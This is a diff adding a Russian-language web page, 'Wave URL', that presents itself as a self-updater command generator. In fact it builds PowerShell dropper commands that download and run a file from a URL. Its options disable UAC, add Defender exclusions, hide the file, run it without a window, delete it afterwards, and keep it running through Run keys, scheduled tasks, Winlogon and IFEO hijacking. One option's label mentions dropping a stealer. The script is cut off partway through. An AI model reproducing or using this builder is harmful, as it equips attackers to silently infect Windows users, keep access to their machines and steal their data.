@@ -1,0 +1,918 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Wave URL</title>
+<meta name="description" content="Offline generator of PowerShell commands for a self-updater.">
+<style>
+:root{
+  --bg:#0a0710; --bg2:#0d0916; --panel:#120d1d; --panel2:#181128; --line:#2e2145;
+  --v:#c08cff; --v2:#8b4df0; --v3:#e6d2ff; --dim:#4a3a68;
+  --red:#ff4d5e; --yel:#ffc23d; --grn:#4dffa8; --blu:#4dc4ff;
+  --px:"Minecraftia","Minecraft","Press Start 2P","Silkscreen","VT323","Arcade Classic",
+       "Pixelify Sans",ui-monospace,"DejaVu Sans Mono",monospace;
+  --mono:ui-monospace,"JetBrains Mono","DejaVu Sans Mono","Liberation Mono",monospace;
+  --b:3px; --off:3px;
+}
+*{box-sizing:border-box}
+html{-webkit-text-size-adjust:100%;color-scheme:dark}
+body{
+  margin:0;padding:0 0 60px;background:var(--bg);color:var(--txt,#ded5ee);
+  font:14px/1.55 var(--px);
+  background-image:
+    radial-gradient(900px 400px at 80% -8%,rgba(139,77,240,.16),transparent 62%),
+    linear-gradient(180deg,var(--bg),var(--bg2) 40%,var(--bg));
+  background-attachment:fixed;
+}
+body::after{content:"";position:fixed;inset:0;pointer-events:none;z-index:60;opacity:.55;
+  background:repeating-linear-gradient(180deg,rgba(0,0,0,0) 0 3px,rgba(0,0,0,.3) 3px 6px)}
+::selection{background:var(--v2);color:#fff}
+.wrap{max-width:1200px;margin:0 auto;padding:0 20px;position:relative;z-index:10}
+
+/* ─── хедер: пиксельный, с "включением" ─── */
+header{padding:26px 0 0}
+.ttl{font-size:clamp(30px,7vw,54px);line-height:1;font-weight:800;letter-spacing:-.02em;
+  display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin:0}
+.ttl .w{color:var(--v3);text-shadow:0 var(--off) 0 #3b1f6b,0 0 22px rgba(192,140,255,.35)}
+.ttl .u{color:var(--v2);font-size:.52em;letter-spacing:.18em;padding-bottom:.25em}
+.ttl .u::before{content:"> ";color:var(--dim)}
+.boot{animation:boot .5s steps(4) 1}
+@keyframes boot{0%{opacity:0;transform:scaleY(.1)}40%{opacity:1;transform:scaleY(1.03)}
+  60%{transform:scaleY(.97)}80%{transform:scaleY(1.01)}100%{transform:none}}
+.sub{color:var(--dim);font-size:12px;margin:14px 0 0;letter-spacing:.06em;display:flex;gap:16px;flex-wrap:wrap}
+.sub b{color:var(--v)}
+.wavebox{height:46px;margin:12px -20px 0;position:relative;overflow:hidden;
+  -webkit-mask-image:linear-gradient(90deg,transparent,#000 6%,#000 94%,transparent);
+          mask-image:linear-gradient(90deg,transparent,#000 6%,#000 94%,transparent)}
+.wavebox svg{position:absolute;inset:0;width:100%;height:100%}
+
+/* ─── панель устройства ─── */
+.devbar{margin:16px 0 0;border:var(--b) solid var(--line);background:var(--panel)}
+.devbar>button{width:100%;display:flex;align-items:center;gap:12px;padding:11px 14px;
+  background:none;border:0;color:var(--v);font:700 12px/1 var(--px);letter-spacing:.12em;
+  cursor:pointer;text-transform:uppercase;transition:background .1s}
+.devbar>button:hover{background:rgba(192,140,255,.09)}
+.devbar>button .arw{margin-left:auto;transition:transform .12s steps(2)}
+.devbar.open>button .arw{transform:rotate(90deg)}
+.devbar>button.reveal{flex:0 0 auto;width:auto;margin-left:auto;padding:5px 11px;font-size:9.5px;
+  border:var(--b) solid var(--line);color:var(--v)}
+.devbar>button.reveal[aria-pressed=true]{background:var(--yel);border-color:var(--yel);color:#1a1200}
+.devbar>button.reveal:hover{background:rgba(255,194,61,.16)}
+/* значения замазаны, пока не нажата «показать» */
+.dev .v{filter:blur(5px);transition:filter .18s steps(4);user-select:none}
+.devbar.clear .dev .v{filter:none;user-select:text}
+.dev .k{filter:none}
+.devbody{display:none;padding:0 14px 14px;grid-template-columns:repeat(auto-fit,minmax(158px,1fr));gap:1px;
+  background:var(--line);border-top:var(--b) solid var(--line)}
+.devbar.open .devbody{display:grid;animation:slide .16s steps(3)}
+@keyframes slide{from{opacity:0;transform:translateY(-6px)}to{opacity:1;transform:none}}
+.dev{background:var(--panel2);padding:10px 12px}
+.dev .k{font-size:9.5px;letter-spacing:.14em;color:var(--dim);text-transform:uppercase;margin-bottom:4px}
+.dev .v{font-size:13px;color:var(--v3);word-break:break-word;line-height:1.35}
+.dev .v.m{font-family:var(--mono);font-size:12px}
+.dev .v.na{color:var(--dim)}
+.devbar .foot{padding:9px 14px;background:#0a0710;font-size:10.5px;color:var(--dim);
+  border-top:var(--b) solid var(--line);letter-spacing:.04em}
+.devbar .foot a{color:var(--v2)}
+
+/* ─── навигация ─── */
+nav{display:flex;margin:18px 0 16px;border:var(--b) solid var(--line);background:var(--panel);width:fit-content}
+nav button{padding:10px 22px;background:none;border:0;border-right:var(--b) solid var(--line);
+  color:var(--dim);font:700 11.5px/1 var(--px);letter-spacing:.14em;cursor:pointer;
+  text-transform:uppercase;transition:.1s}
+nav button:last-child{border-right:0}
+nav button:hover{color:var(--v3);background:rgba(192,140,255,.08)}
+nav button.on{background:var(--v2);color:#fff}
+.panel{display:none}
+.panel.on{display:block;animation:in .18s steps(3)}
+@keyframes in{from{opacity:0;transform:translateY(-5px)}to{opacity:1;transform:none}}
+
+/* ─── блоки ─── */
+.card{background:var(--panel);border:var(--b) solid var(--line);padding:16px 18px;margin-bottom:14px;
+  position:relative;box-shadow:var(--off) var(--off) 0 #08050f}
+.card h2{margin:0 0 12px;font-size:11.5px;letter-spacing:.18em;text-transform:uppercase;color:var(--v)}
+.lb{display:block;font-size:10px;letter-spacing:.14em;text-transform:uppercase;color:var(--dim);
+  margin-bottom:6px;font-weight:700}
+input[type=text],select{width:100%;padding:9px 11px;font:12.5px/1.5 var(--mono);
+  background:#07050d;color:var(--v3);border:var(--b) solid var(--line);border-radius:0;outline:none}
+input::placeholder{color:#3a2d52}
+input:hover,select:hover{border-color:#3d2b5c}
+input:focus,select:focus{border-color:var(--v2);box-shadow:0 0 0 2px rgba(139,77,240,.25)}
+select{cursor:pointer;appearance:none;border-radius:0;
+  background-image:linear-gradient(45deg,transparent 50%,var(--v) 50%),linear-gradient(135deg,var(--v) 50%,transparent 50%);
+  background-position:calc(100% - 15px) 50%,calc(100% - 9px) 50%;
+  background-size:6px 6px,6px 6px;background-repeat:no-repeat}
+.g2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.cols{display:grid;grid-template-columns:1fr 1fr;gap:14px;align-items:start}
+@media(max-width:920px){.cols,.g2{grid-template-columns:1fr}}
+.mt{margin-top:12px}
+
+/* ─── группы + чекбоксы с уровнем риска ─── */
+.grp{border:var(--b) solid var(--line);padding:13px;margin-top:12px;background:#0d0917}
+.grp>.gt{display:flex;align-items:center;gap:8px;font-size:10px;letter-spacing:.16em;
+  text-transform:uppercase;color:var(--v);margin-bottom:11px;font-weight:700}
+.grp>.gt::after{content:"";flex:1;height:var(--b);background:var(--line)}
+.cbs{display:grid;grid-template-columns:1fr 1fr;gap:7px}
+.cbs.one{grid-template-columns:1fr}
+.cbs.three{grid-template-columns:repeat(3,1fr)}
+@media(max-width:640px){.cbs,.cbs.three{grid-template-columns:1fr}}
+.cb{display:flex;align-items:flex-start;gap:9px;cursor:pointer;user-select:none;padding:9px 10px;
+  background:#07050d;border:var(--b) solid var(--line);font-size:12px;line-height:1.4;
+  transition:border-color .1s,background .1s,transform .08s steps(2);color:#c9bce0}
+/* checked state — painted by JS (no :has(), which is unreliable for invalidation) */
+.cb:hover{transform:translate(-1px,-1px);box-shadow:2px 2px 0 #08050f}
+.cb .cd{display:block;font-size:10.5px;color:var(--dim);margin-top:3px;line-height:1.4}
+.cb input,.cb input[type=radio]{appearance:none;width:15px;height:15px;flex:0 0 15px;margin:1px 0 0;
+  border:var(--b) solid #4a3a68;background:#05040a;border-radius:0;cursor:pointer;position:relative}
+.cb.r{border-color:#4a2330}
+/* безопасно */
+.cb.on-safe{border-color:var(--grn);background:rgba(77,255,168,.08);color:#a8ffd8}
+/* средний риск */
+.cb.on-med{border-color:var(--yel);background:rgba(255,194,61,.09);color:#ffe3a3}
+.cb.on-med .cd{color:#b39152}
+/* высокий риск */
+.cb.on-dang{border-color:var(--red);background:rgba(255,77,94,.1);color:#ffb3bc}
+.cb.on-dang .cd{color:#c2707c}
+.cb input:checked{background:var(--grn);border-color:var(--grn);box-shadow:0 0 8px rgba(77,255,168,.4)}
+.cb input:checked::after{content:"";position:absolute;left:3px;top:0;width:4px;height:8px;
+  border:solid #05040a;border-width:0 3px 3px 0;transform:rotate(43deg)}
+.cb.y input:checked{background:var(--yel);border-color:var(--yel);box-shadow:0 0 8px rgba(255,194,61,.45)}
+.cb.r input:checked{background:var(--red);border-color:var(--red);box-shadow:0 0 8px rgba(255,77,94,.5)}
+.cb input[type=radio]{border-radius:0}
+.cb input[type=radio]:checked::after{left:2px;top:2px;width:5px;height:5px;border:0;background:#05040a;transform:none}
+
+/* легенда рисков */
+.legend{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px;padding:9px 11px;
+  background:#0d0917;border:var(--b) solid var(--line)}
+.legend span{display:flex;align-items:center;gap:6px;font-size:9.5px;letter-spacing:.1em;
+  text-transform:uppercase;color:var(--dim)}
+.legend i{width:9px;height:9px;display:block}
+.lg-s i{background:var(--grn)} .lg-y i{background:var(--yel)} .lg-r i{background:var(--red)}
+
+.pathbox{margin-top:12px;padding:10px 12px;background:rgba(139,77,240,.1);
+  border:var(--b) solid var(--v2);font-size:12px;word-break:break-all;font-family:var(--mono)}
+.pathbox b{color:var(--v3)}
+.pathbox span{display:block;color:var(--dim);font-size:11px;margin-top:4px}
+
+/* ─── результат ─── */
+.subtabs{display:flex;gap:0;margin-bottom:11px;flex-wrap:wrap;border:var(--b) solid var(--line);width:fit-content}
+.subtabs button{padding:8px 13px;background:#07050d;border:0;border-right:var(--b) solid var(--line);
+  color:var(--dim);font:700 11px/1 var(--px);cursor:pointer;letter-spacing:.06em;transition:.1s}
+.subtabs button:last-child{border-right:0}
+.subtabs button:hover{color:var(--v3);background:rgba(192,140,255,.08)}
+.subtabs button.on{background:var(--v2);color:#fff}
+.subtabs .len{opacity:.65;font-weight:400;margin-left:4px}
+pre{margin:0;padding:13px;background:#050409;border:var(--b) solid var(--line);font:12.5px/1.7 var(--mono);
+  white-space:pre-wrap;word-break:break-all;min-height:70px;max-height:440px;overflow:auto;border-radius:0}
+pre::-webkit-scrollbar{width:10px}
+pre::-webkit-scrollbar-thumb{background:var(--line);border:2px solid #050409}
+pre.err{color:var(--red);border-color:var(--red)}
+.stats{display:flex;gap:7px;flex-wrap:wrap;margin-top:11px}
+.st{flex:1;min-width:104px;background:#07050d;border:var(--b) solid var(--line);padding:9px 11px}
+.st b{display:block;font-size:17px;color:var(--v3);line-height:1.2}
+.st span{font-size:9.5px;letter-spacing:.1em;text-transform:uppercase;color:var(--dim)}
+.st.y b{color:var(--yel)} .st.b b{color:var(--blu)} .st.g b{color:var(--grn)}
+.btns{display:flex;gap:8px;margin-top:13px;flex-wrap:wrap}
+button.act{padding:11px 20px;background:var(--v2);color:#fff;border:var(--b) solid #5a2fb0;
+  box-shadow:var(--off) var(--off) 0 #3b1f6b;font:700 11.5px/1 var(--px);letter-spacing:.1em;
+  cursor:pointer;text-transform:uppercase;transition:.08s steps(2);border-radius:0}
+button.act:hover{background:var(--v)}
+button.act:active{transform:translate(var(--off),var(--off));box-shadow:0 0 0}
+button.gh{background:#07050d;color:var(--v);border:var(--b) solid var(--line);box-shadow:var(--off) var(--off) 0 #08050f}
+button.gh:active{transform:translate(var(--off),var(--off));box-shadow:0 0 0}
+
+.alert{border:var(--b) solid var(--yel);background:rgba(255,194,61,.08);padding:10px 12px;
+  font-size:11.5px;color:#f0dcae;margin-top:11px}
+.alert b{color:var(--yel)}
+.alert.r{border-color:var(--red);background:rgba(255,77,94,.08);color:#f3c2c9}
+.alert.r b{color:var(--red)}
+.alert.v{border-color:var(--v2);background:rgba(139,77,240,.1);color:#d6c4ee}
+.alert.v b{color:var(--v3)}
+.alert.b{border-color:var(--blu);background:rgba(77,196,255,.08);color:#c2e6f7}
+.alert.b b{color:var(--blu)}
+
+.about p{font-size:12.5px;margin:0 0 10px;max-width:80ch}
+.about ul{margin:0 0 10px;padding-left:18px;font-size:12.5px;max-width:80ch}
+.about li{margin:4px 0}
+.about h3{font-size:10.5px;letter-spacing:.15em;text-transform:uppercase;color:var(--v);
+  margin:20px 0 8px;padding-bottom:6px;border-bottom:var(--b) solid var(--line)}
+.kv{display:grid;grid-template-columns:auto 1fr;gap:7px 16px;font-size:12px;margin:0}
+.kv dt{color:var(--dim);letter-spacing:.1em;text-transform:uppercase;font-size:10px;padding-top:2px}
+.kv dd{margin:0}
+code{background:#0b0812;border:1px solid var(--line);padding:1px 5px;color:var(--v3);font-family:var(--mono);font-size:11.5px}
+footer{margin-top:28px;padding:16px 0;border-top:var(--b) solid var(--line);display:flex;
+  justify-content:space-between;gap:12px;flex-wrap:wrap;color:var(--dim);
+  font-size:10px;letter-spacing:.1em;text-transform:uppercase}
+.toast{position:fixed;bottom:22px;left:50%;transform:translate(-50%,130%);
+  background:var(--grn);color:#05040a;padding:11px 22px;border:var(--b) solid #2b9c6b;
+  font:700 11.5px/1 var(--px);letter-spacing:.1em;text-transform:uppercase;
+  transition:transform .18s steps(3);z-index:70}
+.toast.on{transform:translate(-50%,0)}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header>
+  <h1 class="ttl boot"><span class="w">Wave</span><span class="u">url</span></h1>
+  <div class="sub">
+    <span>Наш телеграмм канал: @WaveSouls2837<span style="color:#4a3a68"></span>-</span>
+    <span> <b id="verTop">/b></span>
+    <span id="netState"></span>
+  </div>
+  <div class="wavebox">
+    <svg viewBox="0 0 1200 46" preserveAspectRatio="none" aria-hidden="true">
+      <path id="w1" fill="none" stroke="#c08cff" stroke-width="2" shape-rendering="crispEdges">
+        <animateTransform attributeName="transform" type="translate" dur="9s"
+          repeatCount="indefinite" calcMode="linear" values="0,0;-600,0"/></path>
+      <path id="w2" fill="none" stroke="#6a34b8" stroke-width="1" shape-rendering="crispEdges">
+        <animateTransform attributeName="transform" type="translate" dur="14s"
+          repeatCount="indefinite" calcMode="linear" values="0,0;-600,0"/></path>
+    </svg>
+  </div>
+</header>
+
+<!-- ─── панель устройства ─── -->
+<div class="devbar" id="devbar">
+  <button type="button" id="devToggle" aria-expanded="false">
+    <span id="devLabel">▸ инфо об устройстве</span><span class="arw">▸</span>
+  </button>
+  <button type="button" id="devReveal" class="reveal" aria-pressed="false">показать</button>
+  <div class="devbody" id="devbody">
+    <div class="dev"><div class="k">IP-адрес</div><div class="v na m" id="dIp">—</div></div>
+    <div class="dev"><div class="k">Страна / Город</div><div class="v na" id="dGeo">—</div></div>
+    <div class="dev"><div class="k">Браузер</div><div class="v na" id="dBr">—</div></div>
+    <div class="dev"><div class="k">Устройство / ОС</div><div class="v na" id="dDev">—</div></div>
+    <div class="dev"><div class="k">Экран</div><div class="v na m" id="dScr">—</div></div>
+    <div class="dev"><div class="k">CPU / RAM</div><div class="v na" id="dHw">—</div></div>
+    <div class="dev"><div class="k">Сеть</div><div class="v na" id="dNet">—</div></div>
+    <div class="dev"><div class="k">Скорость загрузки</div><div class="v na" id="dSpd">—</div></div>
+  </div>
+  <div class="foot" id="devFoot"><b></b>
+    
+    (<span class="m" id="footIps"></span><span class="m"></span>) —
+    </div>
+</div>
+
+<nav>
+  <button data-p="gen" class="on">Команда</button>
+  <button data-p="about">О проекте</button>
+</nav>
+
+<!-- ═════════ COMMAND ═════════ -->
+<section class="panel on" id="p-gen">
+  <div class="cols">
+    <div>
+      <div class="card">
+        <h2>Источник</h2>
+        <label class="lb" for="url">ссылка на файл</label>
+        <input type="text" id="url" spellcheck="false" autocomplete="off"
+          placeholder="пример: https://wavearhive/testfiles/virus.exe">
+        <div class="g2 mt">
+          <div>
+            <label class="lb" for="name">имя файла</label>
+            <input type="text" id="name" spellcheck="false" autocomplete="off" placeholder="авто">
+          </div>
+          <div>
+            <label class="lb" for="dir">сохранить в</label>
+            <select id="dir">
+              <option value="TEMP">%TEMP%</option>
+              <option value="LOCALAPPDATA">%LOCALAPPDATA%</option>
+              <option value="APPDATA">%APPDATA%</option>
+              <option value="DOWNLOADS">Загрузки</option>
+              <option value="SCRIPTDIR">$PSScriptRoot</option>
+              <option value="PROGRAMFILES">Program Files</option>
+              <option value="WINDIR">Windows\System32</option>
+              <option value="CUSTOM">свой путь…</option>
+            </select>
+          </div>
+        </div>
+        <input type="text" id="custom" class="mt" spellcheck="false" autocomplete="off"
+          placeholder="%LOCALAPPDATA%\MyApp  или  C:\Apps\MyApp" style="display:none">
+        <div class="pathbox" id="pathbox">файл попадёт в: <b>—</b><span></span></div>
+      </div>
+
+      <div class="card">
+        <h2>какой цвет что означает</h2>
+        <div class="legend">
+          <span class="lg-s"><i></i>безопасно - все должно без проблем открыться</span>
+          <span class="lg-y"><i></i>средний риск</span>
+          <span class="lg-r"><i></i>опасно</span>
+        </div>
+        <div class="grp">
+          <div class="gt">Папка</div>
+          <div class="cbs one">
+            <label class="cb"><input type="checkbox" id="mkdir"><span>создать папку
+              <span class="cd"></span></span></label>
+            <label class="cb r"><input type="checkbox" id="exclude"><span>добавить папку в исключения антивируса
+              <span class="cd">нужны админ права · Defender перестаёт её проверять</span></span></label>
+          </div>
+        </div>
+        <div class="grp">
+          <div class="gt">UAC</div>
+          <div class="cbs one">
+            <label class="cb r"><input type="checkbox" id="uacOff"><span>отключить UAC
+              <span class="cd">любая программа получает админа без ебучего табла подтверждения</span></span></label>
+            <label class="cb"><input type="checkbox" id="uacOn"><span>включить UAC обратно
+              <span class="cd">не советую врубать, разве что для себя</span></span></label>
+            <label class="cb y"><input type="checkbox" id="uacReboot"><span>добавить перезагрузку
+              <span class="cd">не советую, лучше ручками ребутать пк</span></span></label>
+          </div>
+        </div>
+        <div id="sysHint"></div>
+      </div>
+    </div>
+
+    <div>
+      <div class="card">
+        <h2>Поведение</h2>
+        <div class="grp">
+          <div class="gt">Атрибуты</div>
+          <div class="cbs three">
+            <label class="cb r"><input type="checkbox" id="hidden"><span>скрытый<span class="cd"></span></span></label>
+            <label class="cb r"><input type="checkbox" id="system"><span>системный<span class="cd"></span></span></label>
+            <label class="cb"><input type="checkbox" id="readonly"><span>НЕ ВКЛЮЧАТЬ<span class="cd"></span></span></label>
+          </div>
+        </div>
+        <div class="grp">
+          <div class="gt">Запуск</div>
+          <div class="cbs">
+            <label class="cb"><input type="checkbox" id="wait"><span>ждать завершения
+              <span class="cd">- включать только если кидаешь стиллер</span></span></label>
+            <label class="cb y"><input type="checkbox" id="silent"><span>без окна
+              <span class="cd">- запустит программу в фоне</span></span></label>
+            <label class="cb y"><input type="checkbox" id="admin"><span> попросить права админа
+              <span class="cd">- юзер увидт табло с мальбой дать права админа</span></span></label>
+            <label class="cb y"><input type="checkbox" id="useBITS"><span>через BITS
+              <span class="cd"> не советую на многих пк ее нету</span></span></label>
+          </div>
+        </div>
+        <div class="grp">
+          <div class="gt">Очистка</div>
+          <div class="cbs">
+            <label class="cb"><input type="checkbox" id="cleanup"><span>удалить после запуска
+              <span class="cd">файл удаляет сам себя</span></span></label>
+            <label class="cb"><input type="checkbox" id="cleanupErr"><span>удалить при ошибке
+              <span class="cd">если ты даун сделал хуйню прогу и она не запустилась то файл удалится</span></span></label>
+          </div>
+        </div>
+        <div class="grp">
+          <div class="gt">Ссылка в команде</div>
+          <div class="cbs one">
+            <label class="cb"><input type="radio" name="enc" id="encB64"><span>base64
+              <span class="cd">переживает кавычки и пробелы</span></span></label>
+            <label class="cb"><input type="radio" name="enc" id="encPlain" checked><span>открытый текст
+              <span class="cd">самый короткий, читается как есть</span></span></label>
+          </div>
+        </div>
+        <div class="grp">
+          <div class="gt">Совместимость</div>
+          <div class="cbs one">
+            <label class="cb"><input type="checkbox" id="compat"><span>Windows PowerShell 5.1
+              <span class="cd"></span></span></label>
+            <label class="cb"><input type="checkbox" id="checkDl"><span>проверить загрузку
+              <span class="cd">иначе HTML-страница запустится как .exe</span></span></label>
+          </div>
+        </div>
+        <div class="grp">
+          <div class="gt">Автозапуск</div>
+          <label class="lb" for="appname">отображаемое имя</label>
+          <input type="text" id="appname" value="Wave Updater" spellcheck="false" autocomplete="off">
+          <div class="cbs one mt">
+            <label class="cb y"><input type="checkbox" class="auto" id="aRun" data-m="RUN"><span>Run — при каждом входе
+              <span class="cd">HKCU\…\Run · админ права не нужны</span></span></label>
+            <label class="cb y"><input type="checkbox" class="auto" id="aRunOnce" data-m="RUNONCE"><span>RunOnce — один раз
+              <span class="cd">HKCU\…\RunOnce</span></span></label>
+            <label class="cb y"><input type="checkbox" class="auto" id="aStartup" data-m="STARTUP"><span>папка «Автозагрузка»
+              <span class="cd">виден в диспетчере задач</span></span></label>
+            <label class="cb y"><input type="checkbox" class="auto" id="aTask" data-m="TASK"><span>планировщик задач
+              <span class="cd">schtasks при входе</span></span></label>
+            <label class="cb y"><input type="checkbox" class="auto" id="aActiveSetup" data-m="ACTIVESETUP"><span>Active Setup
+              <span class="cd">HKLM, нужны админ права</span></span></label>
+            <label class="cb r"><input type="checkbox" class="auto" id="aWinShell" data-m="WINLOGON_SHELL"><span>Winlogon Shell
+              <span class="cd">заменяет explorer.exe твоей прогой</span></span></label>
+            <label class="cb r"><input type="checkbox" class="auto" id="aWinInit" data-m="WINLOGON_USERINIT"><span>Winlogon Userinit
+              <span class="cd">нужны админ права</span></span></label>
+            <label class="cb r"><input type="checkbox" class="auto" id="aIfeo" data-m="IFEO"><span>подмена отладчика IFEO
+              <span class="cd"></span></span></label>
+          </div>
+          <div id="autoHint"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>Результат</h2>
+    <div class="subtabs" id="tabs">
+      <button data-t="compact" class="on">Короткая<span class="len"></span></button>
+      <button data-t="b64">Base64<span class="len"></span></button>
+      <button data-t="plain">Читаемая<span class="len"></span></button>
+      <button data-t="steps">Шаги<span class="len"></span></button>
+      <button data-t="sys">Система<span class="len"></span></button>
+      <button data-t="auto">Автозапуск<span class="len"></span></button>
+    </div>
+    <pre id="out">еблан, ссылочку выше на файл вставь</pre>
+    <div class="stats" id="stats"></div>
+    <div class="btns">
+      <button class="act" id="copy">Копировать</button>
+      <button class="act gh" id="copyall">Копировать все</button>
+    </div>
+    <div id="advice"></div>
+  </div>
+</section>
+
+<!-- ═════════ ABOUT ═════════ -->
+<section class="panel" id="p-about">
+  <div class="card about">
+    <h2>О проекте</h2>
+    <dl class="kv">
+      <dt>Author</dt><dd id="owner">@NightWave_Coder</dd>
+      <dt>Telegram channel</dt><dd id="tg">@WaveSouls2837</dd>
+      <dt>Stack</dt><dd>HTML / CSS / JS</dd>
+    </dl>
+  </div>
+</section>
+
+<footer>
+  <span>wave url</span>
+  <span id="footStat">—</span>
+  <span id="footOwner">@NightWave_Coder</span>
+</footer>
+</div>
+<div class="toast" id="toast">Скопировано</div>
+
+<script>
+/* ══════════════ LOGIC (no DOM) ══════════════ */
+const OWNER = '@NightWave_Coder';
+const TELEGRAM = '@WaveSouls2837';
+const VERSION = '3.0';
+
+function filenameFromUrl(url){
+  let p = url.split('#')[0].split('?')[0];
+  try { p = decodeURIComponent(p); } catch(e){}
+  const rest = p.replace(/^[a-z][a-z0-9+.-]*:\/\//i,'');
+  const i = rest.indexOf('/');
+  p = i === -1 ? '' : rest.slice(i);
+  let n = p.replace(/\\/g,'/').replace(/\/+$/,'').split('/').pop() || '';
+  n = n.replace(/[<>:"|?*\x00-\x1f]/g,'_').replace(/^[\s.]+|[\s.]+$/g,'');
+  if (n.length > 100){
+    const d = n.lastIndexOf('.');
+    n = (d > 0 && n.length - d - 1 <= 10) ? n.slice(0,100-(n.length-d-1)-1)+n.slice(d) : n.slice(0,100);
+  }
+  return n || 'download';
+}
+const b64 = s => { const by = new TextEncoder().encode(s); let b='';
+  for (const c of by) b += String.fromCharCode(c); return btoa(b); };
+const sq = s => "'" + s.replace(/'/g,"''") + "'";
+const dec = b => "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" + b + "'))";
+const needsAdmin = m => m==='ACTIVESETUP'||m==='WINLOGON_SHELL'||m==='WINLOGON_USERINIT'||m==='IFEO';
+const LBL = {RUN:'Run',RUNONCE:'RunOnce',STARTUP:'Startup',TASK:'Scheduler',
+  ACTIVESETUP:'Active Setup',WINLOGON_SHELL:'Winlogon Shell',WINLOGON_USERINIT:'Winlogon Userinit',IFEO:'IFEO'};
+
+const DIRS = {
+  TEMP:         {ps:'$env:TEMP',                      pct:'%TEMP%',                real:'C:\\Users\\<u>\\AppData\\Local\\Temp'},
+  LOCALAPPDATA: {ps:'$env:LOCALAPPDATA',              pct:'%LOCALAPPDATA%',        real:'C:\\Users\\<u>\\AppData\\Local'},
+  APPDATA:      {ps:'$env:APPDATA',                   pct:'%APPDATA%',             real:'C:\\Users\\<u>\\AppData\\Roaming'},
+  DOWNLOADS:    {ps:'$env:USERPROFILE+"\\Downloads"',  pct:'%USERPROFILE%\\Downloads', real:'C:\\Users\\<u>\\Downloads'},
+  SCRIPTDIR:    {ps:'$PSScriptRoot',                  pct:'$PSScriptRoot',         real:'script folder'},
+  PROGRAMFILES: {ps:'$env:ProgramFiles',              pct:'%ProgramFiles%',        real:'C:\\Program Files'},
+  WINDIR:       {ps:'$env:windir+"\\System32"',       pct:'%windir%\\System32',     real:'C:\\Windows\\System32'},
+  CUSTOM:       {ps:null,pct:null,real:null}
+};
+function customDir(text){
+  const t = (text||'').trim();
+  if (!t) return null;
+  const e = t.match(/^%([A-Za-z_][A-Za-z0-9_]*)%(.*)$/);
+  if (e) return { ps:'$env:'+e[1]+(e[2]?'+"'+e[2]+'"':''), pct:t, real:t };
+  return { ps:'"'+t+'"', pct:t, real:t };
+}
+function autoBlock(m, appName){
+  const A = sq(appName);
+  switch(m){
+    case 'RUN':     return "New-Item -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Force|Out-Null; Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name "+A+" -Value ('\"' + $p + '\"')";
+    case 'RUNONCE': return "New-Item -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce' -Force|Out-Null; Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce' -Name "+A+" -Value ('\"' + $p + '\"')";
+    case 'STARTUP':  return "$sf=[Environment]::GetFolderPath('Startup'); Set-Content -Path (Join-Path $sf ("+A+"+'.cmd')) -Value ('start \"\" \"' + $p + '\"',[Text.Encoding]::ASCII)";
+    case 'TASK':     return "schtasks /Create /F /SC ONLOGON /TN "+A+" /TR ('\"' + $p + '\"') | Out-Null";
+    case 'ACTIVESETUP': return "$k='HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\"+appName+"'; New-Item -Path $k -Force|Out-Null; Set-ItemProperty $k StubPath ('\"' + $p + '\"'); Set-ItemProperty $k IsInstalled 1; Set-ItemProperty $k Version '1'";
+    case 'WINLOGON_SHELL': return "Set-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' -Name Shell -Value ('explorer.exe,' + $p)";
+    case 'WINLOGON_USERINIT': return "$w='HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'; Set-ItemProperty $w -Name Userinit -Value (((Get-ItemProperty $w).Userinit) + ',' + $p)";
+    case 'IFEO': return "$k='HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe'; New-Item -Path $k -Force|Out-Null; Set-ItemProperty $k Debugger $p";
+  }
+  return '';
+}
+
+function build(url, name, dirKey, custom, appName, o){
+  url = (url||'').trim();
+  if (!url) return null;
+  if (!/^https?:\/\//i.test(url)) return {error:'нужна прямая ссылка, начинающаяся с http:// или https://'};
+  if (/\s/.test(url)) return {error:'в ссылке есть пробелы — замените их на %20'};
+
+  const dir = dirKey === 'CUSTOM' ? customDir(custom) : DIRS[dirKey];
+  if (!dir) return {error:'укажите папку для сохранения'};
+  name = (name||'').trim() || filenameFromUrl(url);
+  name = name.replace(/[<>:"|?*\x00-\x1f]/g,'_').replace(/[\/\\]/g,'_') || 'download';
+  if (name.length > 100) name = name.slice(0,100);
+  appName = (appName||'').trim() || 'Updater';
+  appName = appName.replace(/[\\\/:*?"<>|]/g,'_').slice(0,60);
+
+  const methods = (o.auto||[]).filter(Boolean);
+  const useB64 = o.enc === 'b64';
+  const fl = [];
+  if (o.hidden) fl.push('+h');
+  if (o.system) fl.push('+s');
+  if (o.readonly) fl.push('+r');
+  const attr = fl.length ? 'attrib ' + fl.join(' ') + ' "$p"' : '';
+
+  const TOK = 'URI_';
+  let dlFull = o.useBITS ? "Start-BitsTransfer -Source "+TOK+" -Destination $p"
+                          : "Invoke-WebRequest -Uri "+TOK+" -OutFile $p" + (o.compat?' -UseBasicParsing':'');
+  let dlLite = o.useBITS ? "bits "+TOK+" -t 60 -d $p"
+                          : "iwr "+TOK+" -OutFile $p" + (o.compat?' -UseBasicParsing':'');
+  const uri = useB64 ? '$u' : sq(url);
+  dlFull = dlFull.split(TOK).join(uri);
+  dlLite = dlLite.split(TOK).join(uri);
+  if (o.checkDl) dlFull += "; if(-not (Test-Path $p) -or (Get-Item $p).Length -lt 1){ throw 'download failed' }";
+
+  const run = o.wait
